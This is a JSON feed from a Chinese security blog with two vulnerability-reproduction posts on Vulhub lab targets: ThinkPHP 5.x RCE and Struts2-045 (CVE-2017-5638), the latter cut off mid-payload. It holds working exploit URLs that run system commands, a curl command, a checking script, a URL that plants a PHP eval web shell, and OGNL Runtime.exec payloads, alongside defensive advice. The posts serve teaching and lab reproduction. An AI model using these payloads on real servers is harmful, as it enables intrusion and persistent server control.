{
    "version": "https://jsonfeed.org/version/1",
    "title": "bae的博客 • All posts by \"漏洞复现\" tag",
    "description": "bae的个人博客",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/",
            "url": "https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/",
            "title": "ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）",
            "date_published": "2025-07-27T09:25:25.000Z",
            "content_html": "<h1 id=\"深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）\"><a href=\"#深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）\" class=\"headerlink\" title=\"深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）\"></a>深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）</h1><h2 id=\"一、漏洞背景简介-🔍\"><a href=\"#一、漏洞背景简介-🔍\" class=\"headerlink\" title=\"一、漏洞背景简介 🔍\"></a>一、漏洞背景简介 🔍</h2><p>ThinkPHP 是一个轻量且易用的 PHP 开发框架，广泛应用于 Web 开发。然而，在 ThinkPHP 5.0.x 至 5.0.23 版本中，由于框架对动态函数调用（如 <code>invokeFunction</code>）的访问控制不严格，存在严重的 <strong>远程代码执行（RCE）漏洞</strong>。攻击者可通过精心构造的 URL 参数，调用任意 PHP 函数（如 <code>phpinfo</code> 或 <code>system</code>），实现远程执行任意代码或系统命令，危害极大。</p>\n<p>本文基于 Vulhub 靶场环境，详细讲解该漏洞的原理、环境搭建、利用过程及防御措施，旨在帮助安全从业者和开发者深入理解并防范此类漏洞。</p>\n<hr>\n<h2 id=\"二、漏洞环境搭建\"><a href=\"#二、漏洞环境搭建\" class=\"headerlink\" title=\"二、漏洞环境搭建\"></a>二、漏洞环境搭建</h2><p>为了复现 ThinkPHP 5.x RCE 漏洞，我们使用 Vulhub 提供的靶场环境，结合 Docker 和 Kali Linux 进行搭建。以下是详细步骤：</p>\n<h3 id=\"1-基础环境\"><a href=\"#1-基础环境\" class=\"headerlink\" title=\"1. 基础环境\"></a>1. 基础环境</h3><ul>\n<li><strong>操作系统</strong>：Kali Linux（推荐使用虚拟机）  </li>\n<li><strong>工具</strong>：已安装 Docker 和 Docker Compose  </li>\n<li><strong>网络模式</strong>：<ul>\n<li>NAT（用于访问外部网络）</li>\n<li>仅主机模式（Host-Only，Kali IP：<code>192.168.56.102</code>）</li>\n</ul>\n</li>\n<li><strong>硬件要求</strong>：建议 4GB 内存，2 核 CPU</li>\n</ul>\n<h3 id=\"2-获取-Vulhub-项目\"><a href=\"#2-获取-Vulhub-项目\" class=\"headerlink\" title=\"2. 获取 Vulhub 项目\"></a>2. 获取 Vulhub 项目</h3><p>Vulhub 是一个开源的漏洞靶场集合，包含 ThinkPHP 5.x RCE 环境。执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 切换到工作目录</span><br><span class=\"hljs-built_in\">cd</span> /root/vulhub/thinkphp/5-rce<br><br><span class=\"hljs-comment\"># 如果未下载 Vulhub，克隆项目</span><br>git <span class=\"hljs-built_in\">clone</span> https://github.com/vulhub/vulhub.git<br><span class=\"hljs-built_in\">cd</span> vulhub/thinkphp/5-rce<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-启动漏洞环境\"><a href=\"#3-启动漏洞环境\" class=\"headerlink\" title=\"3. 启动漏洞环境\"></a>3. 启动漏洞环境</h3><p>在 vulhub&#x2F;thinkphp&#x2F;5-rce 目录下，运行以下命令启动 Docker 容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose up -d<br></code></pre></td></tr></table></figure>\n\n<p>启动后，访问以下地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080<br></code></pre></td></tr></table></figure>\n\n<p>若看到 ThinkPHP V5 的欢迎页面，说明环境部署成功 </p>\n<h3 id=\"4-容器管理操作\"><a href=\"#4-容器管理操作\" class=\"headerlink\" title=\"4. 容器管理操作\"></a>4. 容器管理操作</h3><p>查看运行中的容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker ps<br></code></pre></td></tr></table></figure>\n\n<p>示例输出：</p>\n<figure class=\"highlight zsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs zsh\">CONTAINER ID   IMAGE                       PORTS                    NAMES<br>e5117e659934   vulhub/thinkphp:5.0.23      0.0.0.0:8080-&gt;80/tcp     thinkphp_5-rce_1<br></code></pre></td></tr></table></figure>\n\n<p>停止指定容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker stop e5117e659934<br></code></pre></td></tr></table></figure>\n\n<p>一键停止并移除容器及网络：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose down<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"三、漏洞原理解析\"><a href=\"#三、漏洞原理解析\" class=\"headerlink\" title=\"三、漏洞原理解析\"></a>三、漏洞原理解析</h2><h3 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h3><p>ThinkPHP 5.x 的控制器路由机制允许通过 URL 参数动态调用框架内部函数（如 <code>\\think\\app::invokeFunction</code>）。在 5.0.23 及以下版本中，框架未对这些调用进行严格的权限校验，导致攻击者可以通过构造特定参数，调用任意 PHP 函数（如 <code>call_user_func_array</code>），并传递函数名和参数，从而触发远程代码执行。</p>\n<h3 id=\"核心问题\"><a href=\"#核心问题\" class=\"headerlink\" title=\"核心问题\"></a>核心问题</h3><ul>\n<li><strong>动态函数调用</strong>：<code>call_user_func_array</code> 允许动态调用任意 PHP 函数（如 <code>phpinfo</code>、<code>system</code> 等）。</li>\n<li><strong>参数未过滤</strong>：用户输入的 <code>vars[0]</code>（函数名）和 <code>vars[1][]</code>（函数参数）直接传递到函数执行器，未经严格验证。</li>\n<li><strong>路由暴露</strong>：通过 <code>s=/Index/\\think\\app/invokefunction</code>，攻击者可直接访问框架核心类。</li>\n</ul>\n<h3 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h3><ul>\n<li>执行任意 PHP 代码</li>\n<li>运行系统命令，获取权限</li>\n<li>上传 WebShell，长期控制服务器</li>\n<li>窃取配置文件、数据库信息</li>\n<li>删除文件或修改系统配置</li>\n</ul>\n<hr>\n<h2 id=\"四、漏洞利用演示\"><a href=\"#四、漏洞利用演示\" class=\"headerlink\" title=\"四、漏洞利用演示\"></a>四、漏洞利用演示</h2><p>以下展示如何利用 ThinkPHP 5.x RCE 漏洞，基于 Vulhub 靶场环境。</p>\n<h3 id=\"1-测试-PHP-函数调用\"><a href=\"#1-测试-PHP-函数调用\" class=\"headerlink\" title=\"1. 测试 PHP 函数调用\"></a>1. 测试 PHP 函数调用</h3><p>访问以下 Payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br></code></pre></td></tr></table></figure>\n\n<p><strong>参数解析</strong>：</p>\n<ul>\n<li><code>s=/Index/\\think\\app/invokefunction</code>：指定路由</li>\n<li><code>function=call_user_func_array</code>：调用函数</li>\n<li><code>vars[0]=phpinfo</code>：目标函数</li>\n<li><code>vars[1][]=1</code>：参数（执行 phpinfo(1)）</li>\n</ul>\n<p><strong>结果</strong>：</p>\n<p>页面显示 phpinfo 配置信息，说明漏洞存在 </p>\n<h3 id=\"2-执行系统命令\"><a href=\"#2-执行系统命令\" class=\"headerlink\" title=\"2. 执行系统命令\"></a>2. 执行系统命令</h3><p>执行 <code>whoami</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果示例</strong>：</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs haskell\"><span class=\"hljs-title\">www</span>-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span></span><br></code></pre></td></tr></table></figure>\n\n<p>表示系统命令执行成功。</p>\n<h3 id=\"其他命令测试：\"><a href=\"#其他命令测试：\" class=\"headerlink\" title=\"其他命令测试：\"></a>其他命令测试：</h3><ul>\n<li><p>查看用户 ID：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>列出目录：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20/<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>查看网络配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ifconfig<br></code></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"3-使用-Curl-测试\"><a href=\"#3-使用-Curl-测试\" class=\"headerlink\" title=\"3. 使用 Curl 测试\"></a>3. 使用 Curl 测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">curl <span class=\"hljs-string\">&quot;http://192.168.56.102:8080/index.php?s=/Index/\\\\think\\\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&quot;</span><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：URL 中的 <code>\\</code> 要写成 <code>\\\\</code></p>\n</blockquote>\n<h3 id=\"4-使用-Burp-Suite-测试\"><a href=\"#4-使用-Burp-Suite-测试\" class=\"headerlink\" title=\"4. 使用 Burp Suite 测试\"></a>4. 使用 Burp Suite 测试</h3><ul>\n<li>在浏览器中访问目标页面，拦截请求</li>\n<li>将 Payload 粘贴进 Repeater 中测试</li>\n<li>修改 <code>vars[1][]</code> 的值如 <code>id</code>、<code>ls</code> 等</li>\n</ul>\n<hr>\n<h2 id=\"五、Payload-结构总结\"><a href=\"#五、Payload-结构总结\" class=\"headerlink\" title=\"五、Payload 结构总结\"></a>五、Payload 结构总结</h2><table>\n<thead>\n<tr>\n<th>参数键</th>\n<th>功能说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>s</code></td>\n<td>请求路由，指向 ThinkPHP 核心类</td>\n</tr>\n<tr>\n<td><code>function</code></td>\n<td>要调用的 PHP 函数（如 <code>call_user_func_array</code>）</td>\n</tr>\n<tr>\n<td><code>vars[0]</code></td>\n<td>执行的函数名称（如 <code>phpinfo</code>, <code>system</code>）</td>\n</tr>\n<tr>\n<td><code>vars[1][]</code></td>\n<td>函数的参数数组（如 <code>whoami</code>, <code>id</code>）</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"六、防御措施\"><a href=\"#六、防御措施\" class=\"headerlink\" title=\"六、防御措施\"></a>六、防御措施</h2><ol>\n<li><p><strong>升级 ThinkPHP 版本</strong></p>\n<p>升级至 ThinkPHP 5.0.24 或更高版本。</p>\n</li>\n<li><p><strong>输入验证与过滤</strong></p>\n<ul>\n<li>白名单验证 <code>s</code> 参数</li>\n<li>禁用危险函数如 <code>call_user_func_array</code></li>\n<li>严格过滤所有用户输入参数</li>\n</ul>\n</li>\n<li><p><strong>禁用危险函数</strong></p>\n<p>在 <code>php.ini</code> 中：</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">disable_functions = <span class=\"hljs-keyword\">eval</span>,<span class=\"hljs-keyword\">exec</span>,<span class=\"hljs-keyword\">system</span>,passthru,shell_exec,proc_open,call_user_func_array<br></code></pre></td></tr></table></figure>\n</li>\n<li><p><strong>最小权限原则</strong></p>\n<p>Web 服务运行用户不要使用 <code>root</code>，限制文件访问权限。</p>\n</li>\n<li><p><strong>部署 WAF</strong></p>\n<p>拦截请求中包含敏感函数或路径的攻击尝试。</p>\n</li>\n<li><p><strong>安全审计与监控</strong></p>\n<p>定期扫描、日志审计，发现异常行为。</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"七、笔记总结\"><a href=\"#七、笔记总结\" class=\"headerlink\" title=\"七、笔记总结\"></a>七、笔记总结</h2><table>\n<thead>\n<tr>\n<th>内容项</th>\n<th>信息</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>漏洞类型</td>\n<td>RCE（远程代码执行）</td>\n</tr>\n<tr>\n<td>影响版本</td>\n<td>ThinkPHP 5.0.x 至 5.0.23</td>\n</tr>\n<tr>\n<td>漏洞原因</td>\n<td>动态函数调用缺乏授权校验</td>\n</tr>\n<tr>\n<td>复现方式</td>\n<td>URL GET 请求构造 Payload</td>\n</tr>\n<tr>\n<td>环境工具</td>\n<td>Vulhub、Docker、Kali Linux</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"八、附加玩法\"><a href=\"#八、附加玩法\" class=\"headerlink\" title=\"八、附加玩法\"></a>八、附加玩法</h2><h3 id=\"自动化检测脚本\"><a href=\"#自动化检测脚本\" class=\"headerlink\" title=\"自动化检测脚本\"></a>自动化检测脚本</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br><br>url = <span class=\"hljs-string\">&quot;http://192.168.56.102:8080/index.php?s=/Index/\\\\think\\\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&quot;</span><br>response = requests.get(url)<br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;www-data&quot;</span> <span class=\"hljs-keyword\">in</span> response.text:<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Vulnerability found!&quot;</span>)<br><span class=\"hljs-keyword\">else</span>:<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;No vulnerability detected.&quot;</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"上传-WebShell\"><a href=\"#上传-WebShell\" class=\"headerlink\" title=\"上传 WebShell\"></a>上传 WebShell</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%27pass%27%5D%29%3B%20%3F%3E%27%20%3E%20/var/www/html/shell.php<br></code></pre></td></tr></table></figure>\n\n<p>使用蚁剑连接：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs cpp\">http:<span class=\"hljs-comment\">//192.168.56.102:8080/shell.php</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"提权尝试\"><a href=\"#提权尝试\" class=\"headerlink\" title=\"提权尝试\"></a>提权尝试</h3><p>结合弱口令、提权漏洞等，可使用 Metasploit 等工具进一步入侵。</p>\n<hr>\n<h2 id=\"九、总结\"><a href=\"#九、总结\" class=\"headerlink\" title=\"九、总结\"></a>九、总结</h2><p>ThinkPHP 5.x RCE 漏洞是一个典型的动态函数调用漏洞，利用简单但危害极大。通过 Vulhub 靶场，我们可以快速复现漏洞，深入理解其原理和利用方式。</p>\n<p>开发者应及时升级框架版本，实施严格的输入验证和权限控制，部署 WAF 和监控机制，以降低漏洞被利用的风险。</p>\n<p>希望本文能帮助读者更好地理解和防范 ThinkPHP RCE 漏洞，同时提升 Web 应用安全开发的意识！</p>\n<hr>\n<h2 id=\"⚠️-免责声明\"><a href=\"#⚠️-免责声明\" class=\"headerlink\" title=\"⚠️ 免责声明\"></a>⚠️ 免责声明</h2><p>本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。</p>\n",
            "tags": [
                "Web安全",
                "RCE",
                "漏洞复现",
                "ThinkPHP"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "url": "https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "title": "Struts2-045远程代码执行漏洞复现与原理分析",
            "date_published": "2025-07-24T00:10:34.000Z",
            "content_html": "<h1 id=\"Struts2-045远程代码执行漏洞复现与原理分析\"><a href=\"#Struts2-045远程代码执行漏洞复现与原理分析\" class=\"headerlink\" title=\"Struts2-045远程代码执行漏洞复现与原理分析\"></a>Struts2-045远程代码执行漏洞复现与原理分析</h1><h2 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h2><p>Struts2-045（CVE-2017-5638）是Apache Struts2框架中的一个严重远程代码执行漏洞，该漏洞因其影响范围广、利用简单而备受关注。攻击者可以通过构造恶意的Content-Type请求头，在目标服务器上执行任意系统命令。</p>\n<h2 id=\"漏洞基本信息\"><a href=\"#漏洞基本信息\" class=\"headerlink\" title=\"漏洞基本信息\"></a>漏洞基本信息</h2><h3 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h3><ul>\n<li><strong>Apache Struts 2.3.5 - 2.3.31</strong>（包含2.3.31版本）</li>\n<li><strong>Apache Struts 2.5.0 - 2.5.10</strong>（包含2.5.10版本）</li>\n</ul>\n<h3 id=\"漏洞等级\"><a href=\"#漏洞等级\" class=\"headerlink\" title=\"漏洞等级\"></a>漏洞等级</h3><ul>\n<li><strong>CVSS评分</strong>: 10.0（严重）</li>\n<li><strong>漏洞类型</strong>: 远程代码执行（RCE）</li>\n<li><strong>攻击复杂度</strong>: 低</li>\n</ul>\n<h3 id=\"核心原理\"><a href=\"#核心原理\" class=\"headerlink\" title=\"核心原理\"></a>核心原理</h3><p>Struts2框架在处理文件上传请求时，会解析Content-Type请求头。当Content-Type格式不正确时，框架会抛出异常，而<strong>异常处理过程中会对错误信息进行OGNL表达式解析</strong>，这就给了攻击者可乘之机。</p>\n<h2 id=\"技术原理深度分析\"><a href=\"#技术原理深度分析\" class=\"headerlink\" title=\"技术原理深度分析\"></a>技术原理深度分析</h2><h3 id=\"OGNL表达式注入机制\"><a href=\"#OGNL表达式注入机制\" class=\"headerlink\" title=\"OGNL表达式注入机制\"></a>OGNL表达式注入机制</h3><p><strong>OGNL（Object-Graph Navigation Language）</strong> 是Struts2框架使用的表达式语言，用于在Java对象之间进行导航和操作。</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-comment\">// OGNL表达式示例</span><br><span class=\"hljs-selector-id\">#context</span><span class=\"hljs-selector-attr\">[<span class=\"hljs-string\">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span> = false<br>@java<span class=\"hljs-selector-class\">.lang</span>.Runtime@<span class=\"hljs-built_in\">getRuntime</span>()<span class=\"hljs-selector-class\">.exec</span>(<span class=\"hljs-string\">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞触发流程\"><a href=\"#漏洞触发流程\" class=\"headerlink\" title=\"漏洞触发流程\"></a>漏洞触发流程</h3><ol>\n<li><strong>请求接收</strong>: 服务器接收包含恶意Content-Type的HTTP请求</li>\n<li><strong>类型解析</strong>: Struts2尝试解析Content-Type头部信息</li>\n<li><strong>异常触发</strong>: 恶意构造的Content-Type导致解析异常</li>\n<li><strong>错误处理</strong>: 异常处理器对错误信息进行OGNL解析</li>\n<li><strong>代码执行</strong>: 恶意OGNL表达式被执行，实现RCE</li>\n</ol>\n<h3 id=\"关键源码分析\"><a href=\"#关键源码分析\" class=\"headerlink\" title=\"关键源码分析\"></a>关键源码分析</h3><p>漏洞位于<code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest</code>类中：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs typescript\"><span class=\"hljs-comment\">// 简化的漏洞代码逻辑</span><br><span class=\"hljs-keyword\">private</span> <span class=\"hljs-built_in\">void</span> <span class=\"hljs-title function_\">buildErrorMessage</span>(<span class=\"hljs-params\"><span class=\"hljs-title class_\">Throwable</span> e, <span class=\"hljs-title class_\">Object</span>[] args</span>) &#123;<br>    <span class=\"hljs-title class_\">String</span> errorMessage = localizedTextProvider.<span class=\"hljs-title function_\">findDefaultText</span>(e.<span class=\"hljs-title function_\">getMessage</span>(), locale, args);<br>    <span class=\"hljs-comment\">// 这里会对errorMessage进行OGNL表达式解析，导致RCE</span><br>    <span class=\"hljs-keyword\">if</span> (errorMessage != <span class=\"hljs-literal\">null</span>) &#123;<br>        errorMessage = <span class=\"hljs-title class_\">TextParseUtil</span>.<span class=\"hljs-title function_\">translateVariables</span>(errorMessage, stack);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"实验环境搭建\"><a href=\"#实验环境搭建\" class=\"headerlink\" title=\"实验环境搭建\"></a>实验环境搭建</h2><h3 id=\"系统架构\"><a href=\"#系统架构\" class=\"headerlink\" title=\"系统架构\"></a>系统架构</h3><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nix\">┌─ 攻击机（Host）<br>│  └─ Windows<span class=\"hljs-symbol\">/Linux</span> <span class=\"hljs-operator\">+</span> BurpSuite<br>│<br>└─ 靶机（Kali VM）<br>   ├─ <span class=\"hljs-params\">IP:</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.102</span><br>   ├─ Docker <span class=\"hljs-operator\">+</span> Vulhub<br>   └─ Struts2 App (Port <span class=\"hljs-number\">8080</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Docker环境部署\"><a href=\"#Docker环境部署\" class=\"headerlink\" title=\"Docker环境部署\"></a>Docker环境部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 1. 克隆Vulhub项目</span><br>git <span class=\"hljs-built_in\">clone</span> https://github.com/vulhub/vulhub.git<br><br><span class=\"hljs-comment\"># 2. 进入S2-045目录</span><br><span class=\"hljs-built_in\">cd</span> vulhub/struts2/s2-045<br><br><span class=\"hljs-comment\"># 3. 启动靶场</span><br>docker-compose up -d<br><br><span class=\"hljs-comment\"># 4. 验证容器状态</span><br>docker ps -a<br></code></pre></td></tr></table></figure>\n\n<p><strong>预期输出</strong>:</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">CONTAINER</span> ID   IMAGE                   COMMAND       CREATED     STATUS      PORTS                    NAMES<br><span class=\"hljs-attribute\">2363a15cda30</span>   vulhub/struts2:<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">30</span>   <span class=\"hljs-string\">&quot;mvn-server&quot;</span> <span class=\"hljs-number\">2</span>min ago   Up <span class=\"hljs-number\">2</span>min     <span class=\"hljs-number\">0.0.0.0:8080</span>-&gt;<span class=\"hljs-number\">8080</span>/tcp  s2-<span class=\"hljs-number\">045</span>-struts2-<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"环境验证\"><a href=\"#环境验证\" class=\"headerlink\" title=\"环境验证\"></a>环境验证</h3><p>访问 <code>http://192.168.56.102:8080/</code> 应该能看到Struts2默认页面。</p>\n<h2 id=\"漏洞利用实战\"><a href=\"#漏洞利用实战\" class=\"headerlink\" title=\"漏洞利用实战\"></a>漏洞利用实战</h2><h3 id=\"Payload构造原理\"><a href=\"#Payload构造原理\" class=\"headerlink\" title=\"Payload构造原理\"></a>Payload构造原理</h3><p>恶意Content-Type的核心结构：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-attribute\">Content</span>-Type: %&#123;OGNL_EXPRESSION&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"完整攻击载荷\"><a href=\"#完整攻击载荷\" class=\"headerlink\" title=\"完整攻击载荷\"></a>完整攻击载荷</h3><figure class=\"highlight smalltalk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs smalltalk\"><span class=\"hljs-type\">GET</span> / <span class=\"hljs-type\">HTTP</span>/<span class=\"hljs-number\">1.1</span><br><span class=\"hljs-type\">Host</span>: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.102</span>:<span class=\"hljs-number\">8080</span><br><span class=\"hljs-type\">User</span>-<span class=\"hljs-type\">Agent</span>: <span class=\"hljs-type\">Mozilla</span>/<span 